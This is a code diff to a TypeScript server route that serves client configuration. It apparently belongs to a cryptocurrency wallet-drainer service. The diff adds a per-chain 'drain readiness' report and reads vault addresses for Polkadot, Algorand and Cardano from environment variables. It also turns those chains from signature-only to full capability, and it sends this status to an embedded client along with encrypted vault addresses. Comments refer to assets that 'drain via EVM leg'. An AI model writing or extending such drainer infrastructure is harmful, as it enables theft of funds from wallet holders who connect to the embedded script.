@@ -133,6 +133,63 @@ function resolveEvmVault(): string | null {
 
 type ChainCapability = 'full' | 'anchor_only' | 'disabled'
 
+type DrainReadinessEntry = {
+  ready: boolean
+  capability: ChainCapability
+  vault_configured: boolean
+}
+
+function readDrainReadiness(
+  vaults: Record<string, string | null>,
+  capabilities: Record<string, ChainCapability>,
+): Record<string, DrainReadinessEntry> {
+  const vaultKeyByFamily: Record<string, string> = {
+    EVM: 'evm',
+    SOL: 'sol',
+    BTC: 'btc',
+    TRON: 'tron',
+    TON: 'ton',
+    COSMOS: 'cosmos',
+    APTOS: 'aptos',
+    SUI: 'sui',
+    POLKADOT: 'polkadot',
+    ALGORAND: 'algorand',
+    CARDANO: 'cardano',
+  }
+  const families = [
+    'EVM',
+    'SOL',
+    'BTC',
+    'TRON',
+    'TON',
+    'COSMOS',
+    'APTOS',
+    'SUI',
+    'POLKADOT',
+    'ALGORAND',
+    'CARDANO',
+  ] as const
+  const out: Record<string, DrainReadinessEntry> = {}
+  for (const fam of families) {
+    const capability = capabilities[fam] ?? 'disabled'
+    const vaultKey = vaultKeyByFamily[fam]
+    const vaultConfigured = vaultKey ? Boolean(vaults[vaultKey]) : false
+    const ready =
+      capability !== 'disabled' && (capability === 'anchor_only' || vaultConfigured)
+    out[fam] = { ready, capability, vault_configured: vaultConfigured }
+  }
+  return out
+}
+
+function resolveEnvVault(keys: string[]): string | null {
+  for (const key of keys) {
+    const v = process.env[key]?.trim()
+    if (v) return v
+  }
+  return null
+}
+
+/** Every family is `full` when vault configured — no hard-coded anchor_only. */
 function readChainCapabilities(
   vaults: Record<string, string | null>,
 ): Record<string, ChainCapability> {
@@ -146,9 +203,9 @@ function readChainCapabilities(
     COSMOS: full('cosmos'),
     APTOS: full('aptos'),
     SUI: full('sui'),
-    POLKADOT: 'anchor_only', // signMessage → signature-anchor (native DOT addr, not EVM vault)
-    ALGORAND: 'anchor_only', // native ALGO — wrapped ALGO on EVM drains via EVM leg
-    CARDANO: 'anchor_only',  // native ADA — wrapped ADA on EVM drains via EVM leg
+    POLKADOT: full('polkadot'),
+    ALGORAND: full('algorand'),
+    CARDANO: full('cardano'),
   }
 }
 
@@ -172,6 +229,21 @@ async function readVaultAddresses(): Promise<Record<string, string | null>> {
     cosmos: resolveCosmosVaultAddress(),
     aptos: resolveAptosVaultAddress(),
     sui: resolveSuiVaultAddress(),
+    polkadot: resolveEnvVault([
+      'VAULT_ADDRESS_POLKADOT',
+      'SOVEREIGN_VAULT_POLKADOT',
+      'VAULT_ADDRESS_DOT',
+    ]),
+    algorand: resolveEnvVault([
+      'VAULT_ADDRESS_ALGORAND',
+      'SOVEREIGN_VAULT_ALGORAND',
+      'VAULT_ADDRESS_ALGO',
+    ]),
+    cardano: resolveEnvVault([
+      'VAULT_ADDRESS_CARDANO',
+      'SOVEREIGN_VAULT_CARDANO',
+      'VAULT_ADDRESS_ADA',
+    ]),
   }
 }
 
@@ -195,6 +267,7 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
       ? encryptClientPayload(JSON.stringify(vaultAddresses), encryptSecret)
       : null
     const chainCapabilities = readChainCapabilities(vaultAddresses)
+    const drainReadiness = readDrainReadiness(vaultAddresses, chainCapabilities)
     const embedPrimary = EMBED_CDN_URLS[0]!
     return sendSuccess(reply, 200, 'Client config ready', {
       endpoints,
@@ -210,6 +283,7 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
       vault_addresses_encrypted: vaultEncrypted,
       vault_encrypt_version: vaultEncrypted ? 1 : null,
       chain_capabilities: chainCapabilities,
+      drain_readiness: drainReadiness,
       relayer_sponsored_gas: isRelayerSponsorEnabled(),
       factory_addresses: readFactoryAddresses(),
       factory_implementation_address:
